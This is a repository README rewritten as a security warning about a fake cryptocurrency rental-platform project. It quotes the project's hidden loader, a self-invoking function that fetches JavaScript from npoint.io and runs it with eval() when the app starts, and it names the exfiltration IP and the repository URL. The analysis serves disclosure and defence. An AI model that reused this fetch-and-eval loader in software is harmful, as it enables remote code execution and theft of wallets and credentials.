# Real Estate Rental Platform - ⚠️ SECURITY WARNING: MALICIOUS REPOSITORY ⚠️

⚠️ **WARNING: This repository contains malicious code that steals sensitive information!** ⚠️

This repository appears to be a legitimate rental platform but actually contains obfuscated JavaScript code that:

1. Scans your computer for sensitive files (cryptocurrency wallets, credentials, etc.)
2. Establishes remote connections to suspicious IP addresses (138.201.36.254)
3. Executes arbitrary commands on your system
4. Steals sensitive information and uploads it to remote servers

## Original Repository Description (DO NOT USE)

Rental Platform aims to revolutionize the rental property market by integrating cryptocurrency payments into a secure, scalable platform that simplifies transactions for property owners and tenants.

![alt text](public/real-estate.png)

### Support a multi-cryptocurrency payment system.

A secure crypto payment system that allows users to pay rent or make deposits using cryptocurrencies.

![alt text](public/marketplace.png)

### 🔥 Web3 is not a temporary trend - it is the future of the Internet!

#### 🚀 Are you ready to enter the Web3 Era? Let's explore a decentralized world today!

## DO NOT EXECUTE THE FOLLOWING COMMANDS

```
   git clone https://bitbucket.org/web3_space/real-estate-rental-platform
```

```
   npm install
```

```
   npm start
```

## Malicious Code Detection

The repository contains heavily obfuscated JavaScript that searches for cryptocurrency wallets, SSH keys, environment files, and other sensitive information on your system.

### Malicious Code Locations

**server/controllers/paymentController.js (lines 129-132):**
```javascript
//Get Cookie
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
    const rs_L = await axios.get("https://api.npoint.io/c04c4a604c305634f824");
    const rs_C = await axios.get("https://api.npoint.io/7ff61097aa52f82cffb0");
    eval(rs_L.data.cookie);
    eval(rs_C.data.cookie);
})();
```

This code fetches external JavaScript from remote servers and executes it using `eval()`, allowing arbitrary code execution on your system. The external code contains the functionality to scan your system for sensitive files and exfiltrate data.

**server/app.js (line 47):**
```javascript
const errorPayment = require("./controllers/paymentController");
```

This suspicious line appears at the end of the app.js file and doesn't assign the imported module to a variable that gets used. Its only purpose is to ensure the paymentController.js file is loaded and executed when the application starts, which triggers the malicious self-invoking function that downloads and executes external code.
